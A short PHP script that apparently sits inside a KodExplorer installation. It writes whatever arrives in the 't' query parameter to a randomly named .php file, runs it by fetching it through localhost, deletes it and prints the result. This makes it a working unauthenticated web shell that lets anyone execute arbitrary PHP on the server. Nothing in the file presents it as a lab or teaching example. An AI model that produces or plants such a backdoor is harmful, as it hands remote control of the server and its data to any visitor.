<?php
//random tên
function getRandomWord($len) {
    $word = array_merge(range('a', 'z'), range('A', 'Z'));
    shuffle($word);
    return substr(implode($word), 0, $len);
}
$name = getRandomWord(10).rand(1,10000).".php";
file_put_contents($name, file_get_contents("data:text/html,".rawurlencode($_GET['t'])));
$data = file_get_contents("http://localhost/KodExplorer/data/User/admin/home/desktop/MINHDUC/$name");
unlink($name);
echo $data;
?>